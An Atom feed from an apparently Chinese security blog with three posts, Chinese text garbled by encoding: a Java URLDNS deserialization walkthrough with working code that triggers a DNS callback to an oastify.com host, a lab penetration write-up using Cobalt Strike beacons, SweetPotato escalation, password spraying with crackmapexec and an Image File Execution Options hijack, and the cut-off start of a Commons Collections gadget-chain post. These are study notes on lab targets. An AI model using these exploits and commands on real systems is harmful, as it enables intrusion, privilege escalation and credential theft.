<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>åˆé›¶Â·b10g~ğŸ¥</title>
  
  
  <link href="https://bowuchuling.github.io/atom.xml" rel="self"/>
  
  <link href="https://bowuchuling.github.io/"/>
  <updated>2024-04-06T05:46:22.446Z</updated>
  <id>https://bowuchuling.github.io/</id>
  
  <author>
    <name>Chu0ğŸ¥</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>javaååºåˆ—åŒ–ä¹‹URLDNS</title>
    <link href="https://bowuchuling.github.io/posts/1830i0jy.html"/>
    <id>https://bowuchuling.github.io/posts/1830i0jy.html</id>
    <published>2024-04-06T05:44:18.948Z</published>
    <updated>2024-04-06T05:46:22.446Z</updated>
    
    <content type="html"><![CDATA[<h1>URLDNS</h1><p>å½“æˆ‘ä»¬å¯¹ä¸€ä¸ªç±»è¿›è¡Œååºåˆ—åŒ–æ“ä½œçš„æ—¶å€™ï¼Œä¼šè°ƒç”¨è¯¥ç±»çš„readObjectæ–¹æ³•ï¼Œ</p><p>Demo serializeTest.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> Test;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileNotFoundException;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">serializeTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;./ser.bin&quot;</span>));</span><br><span class="line">        objectOutputStream.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, NoSuchFieldException, IllegalAccessException &#123;</span><br><span class="line">        <span class="comment">//Person person = new Person(&quot;username&quot;,11);</span></span><br><span class="line">        <span class="comment">//System.out.println(person);</span></span><br><span class="line">        HashMap&lt;URL,Integer&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        <span class="comment">//è¿™é‡Œä¸è¦å‘èµ·è¯·æ±‚ï¼ŒæŠŠurlå¯¹è±¡çš„hashcodeæ”¹æˆä¸æ˜¯-1</span></span><br><span class="line">        <span class="type">URL</span> <span class="variable">url</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="string">&quot;http://jm97wyv7516bpv5b21bar09naeg54u.oastify.com&quot;</span>);</span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> url.getClass();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">hashcodefield</span> <span class="operator">=</span> c.getDeclaredField(<span class="string">&quot;hashCode&quot;</span>);</span><br><span class="line">        hashcodefield.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        hashcodefield.set(url,<span class="number">123</span>);</span><br><span class="line">        hashMap.put(url,<span class="number">1</span>);</span><br><span class="line">        hashcodefield.set(url,-<span class="number">1</span>);</span><br><span class="line">        serialize(hashMap);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Demo unserializeTest.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> Test;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">unserializeTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String filename)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">objectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(filename));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">object</span> <span class="operator">=</span> objectInputStream.readObject();</span><br><span class="line">        <span class="keyword">return</span> object;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="comment">//Person person = (Person) unserialize(&quot;ser.bin&quot;);</span></span><br><span class="line">        <span class="comment">//System.out.println(person);</span></span><br><span class="line">        unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è°ƒç”¨é“¾å¦‚ä¸‹</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span> HashMap-&gt;readObject()</span><br><span class="line"><span class="number">2.</span> HashMap-&gt;hash()</span><br><span class="line"><span class="number">3.</span> URL-&gt;hashCode()</span><br><span class="line"><span class="number">4.</span> URLStreamHandler-&gt;hashCode()</span><br><span class="line"><span class="number">5.</span> URLStreamHandler-&gt;getHostAddress()</span><br><span class="line"><span class="number">6.</span> InetAddress-&gt;getByName()</span><br></pre></td></tr></table></figure><p>ç”±äºè¿›è¡Œäº†ååºåˆ—åŒ–æ“ä½œï¼Œæ‰€ä»¥ä¼šè§¦å‘ååºåˆ—åŒ–ç±»çš„readObjectæ–¹æ³•ï¼Œè°ƒç”¨äº†hashæ–¹æ³•ï¼Œç»§ç»­è·Ÿè¸ª</p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240330160634829.png" alt="image-20240330160634829"></p><p>è°ƒç”¨hashcodeæ–¹æ³•ï¼Œç”±äºæˆ‘ä»¬ä¼ å…¥çš„æ˜¯urlï¼Œæ‰€ä»¥ç›´æ¥æ‰¾urlç±»çš„hashcodeæ–¹æ³•</p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240330160723106.png" alt="image-20240330160723106"></p><p>æ³¨æ„åˆ¤æ–­ï¼Œå¦‚æœhashcodeç­‰äº-1ï¼Œæ‰ä¼šè°ƒç”¨this.handler.hashCode</p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240330160743661.png" alt="image-20240330160743661"></p><p>è¿›å…¥hashcodeæ–¹æ³•ï¼Œå‘ç°è°ƒç”¨äº†getHostAddressï¼Œå‚æ•°å³æˆ‘ä»¬è¦å‘é€dnsè¯·æ±‚çš„åœ°å€</p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240330160844591.png" alt="image-20240330160844591"></p><p>è°ƒç”¨getbyNameæ–¹æ³•ï¼Œå‘é€dnsè¯·æ±‚</p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240330161058024.png" alt="image-20240330161058024"></p><p>åœ¨ä½†ç»™mapè¿›è¡Œèµ‹å€¼çš„æ—¶å€™ï¼Œä¼šç”¨åˆ°putæ–¹æ³•</p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240406133851080.png" alt="image-20240406133851080"></p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240406133857208.png" alt="image-20240406133857208"></p><p>putæ–¹æ³•ä¹Ÿä¼šè°ƒç”¨hashæ–¹æ³•ï¼Œè¿›è€Œå°†æ•´æ¡é“¾å­èµ°äº†ä¸€éï¼Œå¯¼è‡´hashcodeä¸ä¸º-1</p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240406133922526.png" alt="image-20240406133922526"></p><p>å°±å¯¼è‡´åœ¨è¿™é‡Œä¸ä¼šè§¦å‘hashcodeï¼Œè¿›è€Œæ‰§è¡Œå¤±è´¥ï¼Œæ‰€ä»¥åœ¨åºåˆ—åŒ–å‰æˆ‘ä»¬éœ€è¦å°†hashcodeåå°„èµ‹å€¼å›-1ï¼Œè¿™æ ·æ‰æœ‰äº†æˆ‘ä»¬ä¸Šè¾¹çš„é‚£æ¡é“¾å­</p>]]></content>
    
    
    <summary type="html">æ•´ç†çš„ç¬”è®°</summary>
    
    
    
    <category term="java" scheme="https://bowuchuling.github.io/categories/java/"/>
    
    <category term="ç¬”è®°" scheme="https://bowuchuling.github.io/categories/java/%E7%AC%94%E8%AE%B0/"/>
    
    
    <category term="ç¬”è®°" scheme="https://bowuchuling.github.io/tags/%E7%AC%94%E8%AE%B0/"/>
    
    <category term="java" scheme="https://bowuchuling.github.io/tags/java/"/>
    
  </entry>
  
  <entry>
    <title>æ¸—é€ Test two</title>
    <link href="https://bowuchuling.github.io/posts/1837i0jz.html"/>
    <id>https://bowuchuling.github.io/posts/1837i0jz.html</id>
    <published>2024-04-05T17:53:50.265Z</published>
    <updated>2024-04-05T18:19:50.910Z</updated>
    
    <content type="html"><![CDATA[<h1>æ¸—é€Test Two</h1><h2 id="flag01">flag01</h2><p>å…ˆä¸Šfscanæ‰«ä¸€æ³¢</p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240406015557477.png" alt="image-20240406015557477"></p><p>å‘ç°å¼±å£ä»¤ï¼Œå·¥å…·è¿æ¥ï¼Œå‘ç°ä¸ºwinç³»ç»Ÿï¼Œç”Ÿæˆä¸€ä¸ªcsé©¬ç›´æ¥ä¸Šçº¿</p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240406015831088.png" alt="image-20240406015831088"></p><p>è¿™é‡Œç”±äºæ˜¯åæœŸå¤ç°ï¼Œæ‰€ä»¥æ²¡æ³•æ‰§è¡Œå‘½ä»¤äº†</p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240406015927917.png" alt="image-20240406015927917"></p><p>ä¸Šçº¿å‘ç°éœ€è¦ææƒï¼Œè¿™é‡Œä½¿ç”¨äº†SweetPotatoè¿›è¡Œææƒï¼Œåˆ©ç”¨SweetPotatoå†è¿è¡Œä¸€æ¬¡é©¬å­ï¼Œå°±å¯ä»¥è·å¾—ä¸Šé¢ç¬¬å››è¡Œçš„systemæƒé™ä¸Šçº¿äº†</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:<span class="regexp">/Users/</span><span class="keyword">Public</span>/sweetpotato.exe -a <span class="string">&quot;type C:\Users\Administrator\flag\flag01.txt&quot;</span></span><br></pre></td></tr></table></figure><p>æ‹¿åˆ°ç¬¬ä¸€ä¸ªflag</p><h2 id="flag02">flag02</h2><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">hashdump</span><br><span class="line">net <span class="keyword">user</span></span><br><span class="line"><span class="title">net</span> use</span><br></pre></td></tr></table></figure><p>æŸ¥çœ‹åœ¨çº¿ç”¨æˆ·</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell quser <span class="string">|| qwinst</span></span><br></pre></td></tr></table></figure><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240406020932863.png" alt="image-20240406020932863"></p><p>å¯ä»¥å‘ç°johnç”¨æˆ·åœ¨çº¿ï¼Œæˆ‘ä»¬å¯ä»¥å°è¯•è¿›ç¨‹æ³¨å…¥</p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240406021005988.png" alt="image-20240406021005988"></p><p>æˆåŠŸä¸Šçº¿ï¼Œä½¿ç”¨net useæŸ¥çœ‹</p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240406021035414.png" alt="image-20240406021035414"></p><p>å‘ç°å…¶åœ¨å…±äº«æ–‡ä»¶ï¼Œåœ¨å…±äº«æ–‡ä»¶å†…å®¹ä¸­å‘ç°è´¦å·å¯†ç ï¼Œå¹¶å¾—åˆ°å¯èƒ½éœ€è¦æ˜ åƒåŠ«æŒçš„hint</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">beacon&gt; shell <span class="keyword">type</span> \\tsclient\<span class="keyword">c</span>\credential.txt</span><br><span class="line">[*] Tasked beacon <span class="keyword">to</span> run: <span class="keyword">type</span> \\tsclient\<span class="keyword">c</span>\credential.txt</span><br><span class="line">[+] host called home<span class="punctuation">,</span> sent: <span class="number">63</span> bytes</span><br><span class="line">[+] received output:</span><br><span class="line">xiaorang.lab\Aldrich:Ald<span class="title">@rLMWuy7Z</span>!#</span><br><span class="line"></span><br><span class="line">Do you know how <span class="keyword">to</span> hijack Image?</span><br></pre></td></tr></table></figure><p>ipconfigå‘ç°æœ‰å†…ç½‘ipï¼Œæ‰€ä»¥å…ˆä¼ fsanå¼€æ‰«</p><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">172.22.8.46:445</span> open</span><br><span class="line"><span class="number">172.22.8.18:1433</span> open</span><br><span class="line"><span class="number">172.22.8.31:445</span> open</span><br><span class="line"><span class="number">172.22.8.15:445</span> open</span><br><span class="line"><span class="number">172.22.8.18:445</span> open</span><br><span class="line"><span class="number">172.22.8.46:139</span> open</span><br><span class="line"><span class="number">172.22.8.31:139</span> open</span><br><span class="line"><span class="number">172.22.8.15:139</span> open</span><br><span class="line"><span class="number">172.22.8.18:139</span> open</span><br><span class="line"><span class="number">172.22.8.31:135</span> open</span><br><span class="line"><span class="number">172.22.8.46:135</span> open</span><br><span class="line"><span class="number">172.22.8.15:135</span> open</span><br><span class="line"><span class="number">172.22.8.18:135</span> open</span><br><span class="line"><span class="number">172.22.8.46:80</span> open</span><br><span class="line"><span class="number">172.22.8.18:80</span> open</span><br><span class="line"><span class="number">172.22.8.15:88</span> open</span><br><span class="line"><span class="string">[*]</span> NetInfo:</span><br><span class="line"><span class="string">[*]</span><span class="number">172</span>.<span class="number">22</span>.<span class="number">8</span>.<span class="number">46</span></span><br><span class="line">   <span class="string">[-&gt;]</span>WIN2016</span><br><span class="line">   <span class="string">[-&gt;]</span><span class="number">172</span>.<span class="number">22</span>.<span class="number">8</span>.<span class="number">46</span></span><br><span class="line"><span class="string">[*]</span> NetInfo:</span><br><span class="line"><span class="string">[*]</span><span class="number">172</span>.<span class="number">22</span>.<span class="number">8</span>.<span class="number">31</span></span><br><span class="line">   <span class="string">[-&gt;]</span>WIN19-CLIENT</span><br><span class="line">   <span class="string">[-&gt;]</span><span class="number">172</span>.<span class="number">22</span>.<span class="number">8</span>.<span class="number">31</span></span><br><span class="line"><span class="string">[*]</span> NetInfo:</span><br><span class="line"><span class="string">[*]</span><span class="number">172</span>.<span class="number">22</span>.<span class="number">8</span>.<span class="number">18</span></span><br><span class="line">   <span class="string">[-&gt;]</span>WIN-WEB</span><br><span class="line">   <span class="string">[-&gt;]</span><span class="number">172</span>.<span class="number">22</span>.<span class="number">8</span>.<span class="number">18</span></span><br><span class="line">   <span class="string">[-&gt;]</span><span class="number">2001</span>:<span class="number">0</span>:348b:fb58:<span class="number">25</span>:71c:d898:7b00</span><br><span class="line"><span class="string">[*]</span> NetBios: <span class="number">172</span>.<span class="number">22</span>.<span class="number">8</span>.<span class="number">31</span>     XIAORANG\WIN19-CLIENT          </span><br><span class="line"><span class="string">[*]</span> NetInfo:</span><br><span class="line"><span class="string">[*]</span><span class="number">172</span>.<span class="number">22</span>.<span class="number">8</span>.<span class="number">15</span></span><br><span class="line">   <span class="string">[-&gt;]</span>DC01</span><br><span class="line">   <span class="string">[-&gt;]</span><span class="number">172</span>.<span class="number">22</span>.<span class="number">8</span>.<span class="number">15</span></span><br><span class="line"><span class="string">[*]</span> NetBios: <span class="number">172</span>.<span class="number">22</span>.<span class="number">8</span>.<span class="number">15</span>     <span class="string">[+]</span>DC XIAORANG\DC01            </span><br><span class="line"><span class="string">[*]</span> NetBios: <span class="number">172</span>.<span class="number">22</span>.<span class="number">8</span>.<span class="number">46</span>     WIN2016.xiaorang.lab                Windows Server <span class="number">2016</span> Datacenter <span class="number">14393</span> </span><br><span class="line"><span class="string">[*]</span> WebTitle: http://<span class="number">172</span>.<span class="number">22</span>.<span class="number">8</span>.<span class="number">18</span>        code:<span class="number">200</span> len:<span class="number">703</span>    title:IIS Windows Server</span><br><span class="line"><span class="string">[*]</span> WebTitle: http://<span class="number">172</span>.<span class="number">22</span>.<span class="number">8</span>.<span class="number">46</span>        code:<span class="number">200</span> len:<span class="number">703</span>    title:IIS Windows Server</span><br><span class="line"><span class="string">[+]</span> mssql:<span class="number">172</span>.<span class="number">22</span>.<span class="number">8</span>.<span class="number">18</span>:<span class="number">1433</span>:sa 1qaz!QAZ</span><br></pre></td></tr></table></figure><p>æŠŠä»£ç†æ­å»ºå¥½ï¼Œå°±å¯ä»¥è¿›å†…ç½‘äº†</p><p>å–·æ´’ä¸€ä¸‹å¯†ç (å…¶å®ä¹Ÿå°±æ˜¯ç”¨å¯†ç ä¸€ä¸ªä¸€ä¸ªç¢°æ’çœ‹èƒ½ä¸èƒ½ç™»å½•ä¸Šå“ªå°æœºå™¨)</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">proxychains</span> -q crackmapexec smb <span class="number">172.22.8.0</span>/<span class="number">24</span> -u <span class="string">&#x27;Aldrich&#x27;</span> -p <span class="string">&#x27;Ald<span class="variable">@rLMWuy7Z</span>!#&#x27;</span></span><br></pre></td></tr></table></figure><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240406021246547.png" alt="image-20240406021246547"></p><p>é’ˆå¯¹ä¸Šé¢çš„å››å°æœºå™¨è¿›è¡Œç™»å½•</p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240406021301874.png" alt="image-20240406021301874"></p><p>ä¼šæç¤ºè¦ä¿®æ”¹å¯†ç ï¼Œä½¿ç”¨ä¸‹é¢è„šæœ¬è¿›è¡Œä¿®æ”¹</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">python3</span> smbpasswd.py xiaorang.lab/Aldrich:<span class="string">&#x27;Ald<span class="variable">@rLMWuy7Z</span>!#&#x27;</span>@<span class="number">172.22.8.15</span> -newpass <span class="string">&#x27;Whoami@666&#x27;</span></span><br></pre></td></tr></table></figure><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240406021324187.png" alt="image-20240406021324187"></p><p>è¿œç¨‹ç™»å½•</p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240406021510178.png" alt="image-20240406021510178"></p><p>ç„¶åè¿™å°æœºå™¨æ˜¯ä¸å‡ºç½‘çš„ï¼Œç„¶åæˆ‘ç”¨172.22.8.18è½¬å‘ä¸Šçº¿çš„CS</p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240406021523361.png" alt="image-20240406021523361"></p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240406021529046.png" alt="image-20240406021529046"></p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240406021533883.png" alt="image-20240406021533883"></p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240406021538746.png" alt="image-20240406021538746"></p><p>åŒå‡»ä¸Šçº¿ï¼Œä¸‹ä¸€æ­¥å°±æ˜¯æ˜ åƒåŠ«æŒææƒï¼Œå…ˆæŸ¥çœ‹æƒé™ï¼š</p><figure class="highlight dsconfig"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">get-acl</span> -<span class="string">path</span> <span class="string">&quot;HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options&quot;</span> | <span class="string">fl</span> *</span><br></pre></td></tr></table></figure><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240406021552538.png" alt="image-20240406021552538"></p><p>è¿™é‡Œæˆ‘ä»¬å‘ç°æ‰€æœ‰æ­£å¸¸ç™»å½•çš„ç”¨æˆ·éƒ½å¯ä»¥ä¿®æ”¹æ³¨å†Œè¡¨ï¼Œåˆ©ç”¨è¿™ä¸ªæ€§è´¨ï¼Œä¿®æ”¹æ³¨å†Œè¡¨æ˜ åƒåŠ«æŒï¼Œä½¿ç”¨æ”¾å¤§é•œè¿›è¡Œææƒï¼Œå…¶å®ä¹Ÿå°±æ˜¯æŠŠæœ¬æ¥ç”¨æˆ·ä¸»é¡µç‚¹æ”¾å¤§é•œå¯åŠ¨çš„magnify.exeæ›¿æ¢æˆC:\windows\system32\cmd.exeï¼Œè¿™æ ·å°±ç›´æ¥ææƒæˆsystemäº†</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">REG <span class="keyword">ADD</span><span class="language-bash"> <span class="string">&quot;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\magnify.exe&quot;</span> /v Debugger /t REG_SZ /d <span class="string">&quot;C:\windows\system32\cmd.exe&quot;</span></span></span><br></pre></td></tr></table></figure><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240406021629259.png" alt="image-20240406021629259"></p><p>ç‚¹å‡»æ”¾å¤§é•œæ‰“å¼€ç»ˆç«¯ï¼Œå†è¿è¡Œé©¬å­å°±æ˜¯systemæƒé™çš„é©¬å­äº†</p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240406021653618.png" alt="image-20240406021653618"></p><figure class="highlight moonscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell <span class="built_in">type</span> <span class="name">C</span>:\Users\Administrator\flag\flag02.txt</span><br></pre></td></tr></table></figure><h2 id="flag03">flag03</h2><p>ç”±äºè¿™ä¸ªä»£ç†å®åœ¨å¤ªåƒåœ¾ï¼Œå¯¼è‡´æˆ‘åé¢è¿è¿œç¨‹æ¡Œé¢éƒ½æ‰“ä¸å¼€ï¼Œæ‰€ä»¥å…ˆæ”¾ä¸€æ”¾</p>]]></content>
    
    
    <summary type="html">æ•´ç†çš„ç¬”è®°</summary>
    
    
    
    <category term="æ¸—é€" scheme="https://bowuchuling.github.io/categories/%E6%B8%97%E9%80%8F/"/>
    
    <category term="ç¬”è®°" scheme="https://bowuchuling.github.io/categories/%E6%B8%97%E9%80%8F/%E7%AC%94%E8%AE%B0/"/>
    
    
    <category term="ç¬”è®°" scheme="https://bowuchuling.github.io/tags/%E7%AC%94%E8%AE%B0/"/>
    
    <category term="æ¸—é€" scheme="https://bowuchuling.github.io/tags/%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>CCé“¾ ååºåˆ—åŒ–</title>
    <link href="https://bowuchuling.github.io/posts/1837cccc.html"/>
    <id>https://bowuchuling.github.io/posts/1837cccc.html</id>
    <published>2024-04-04T18:20:11.346Z</published>
    <updated>2024-04-04T18:24:58.035Z</updated>
    
    <content type="html"><![CDATA[<h1>CCé“¾ ååºåˆ—åŒ–</h1><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240401202109805.png" alt="image-20240401202109805"></p><h2 id="CCé“¾ç®€ä»‹">CCé“¾ç®€ä»‹</h2><p>Apache Commons æ˜¯å¯¹ JDK çš„æ‹“å±•ï¼ŒåŒ…å«äº†å¾ˆå¤šå¼€æºçš„å·¥å…·ï¼Œç”¨äºè§£å†³å¹³æ—¶ç¼–ç¨‹ç»å¸¸ä¼šé‡åˆ°çš„é—®é¢˜ã€‚Apache Commons å½“ä¸­æœ‰ä¸€ä¸ªç»„ä»¶å«åš Apache Commons Collectionsï¼Œå°è£…äº† Java çš„ Collection ç›¸å…³ç±»å¯¹è±¡ã€‚CCé“¾ ç¼–å†™çš„æ˜¯æµ‹è¯•ä»£ç ï¼Œå’Œ ysoserial ä¸­çš„ç¨æœ‰ä¸åŒã€‚ ä¸‹é¢çš„æ˜¯ç»å¸¸ç”¨åˆ°çš„ éå¸¸é‡è¦ çš„Transformeræ¥å£çš„å®ç°ç±»ã€‚</p><h3 id="ConstantTransformer">ConstantTransformer</h3><p>Transformer æ¥å£çš„å®ç°ç±»ï¼Œå¹¶é‡å†™äº†å…¶æ¥å£ç±»çš„ transform æ–¹æ³•ã€‚å…¶ transform æ–¹æ³•ä½œç”¨æ˜¯è·å–ä¸€ä¸ªå¯¹è±¡ç±»å‹ï¼Œå…³é”®ä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ConstantTransformer</span> <span class="keyword">implements</span> <span class="title class_">Transformer</span>, Serializable &#123;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">long</span> <span class="variable">serialVersionUID</span> <span class="operator">=</span> <span class="number">6374440726369055124L</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">Transformer</span> <span class="variable">NULL_INSTANCE</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="literal">null</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Object iConstant;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Transformer <span class="title function_">getInstance</span><span class="params">(Object constantToReturn)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (constantToReturn == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> NULL_INSTANCE;</span><br><span class="line">        